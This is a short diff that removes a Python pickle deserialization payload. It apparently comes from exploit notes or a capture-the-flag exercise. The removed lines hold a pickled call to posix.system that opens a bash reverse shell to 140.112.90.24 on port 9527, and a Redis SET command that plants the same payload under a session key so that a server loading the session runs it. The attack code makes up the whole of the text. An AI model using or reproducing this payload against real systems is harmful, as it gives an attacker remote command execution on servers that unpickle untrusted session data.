@@ -1,4 +1,0 @@
-b"\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c 'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1'q\x01\x85q\x02Rq\x03."
-
-(local dbg)SET "session:1de76862-b3f7-423b-8aa2-1b1da7be8a80" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c 'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1'q\x01\x85q\x02Rq\x03."
-(remote dbg)
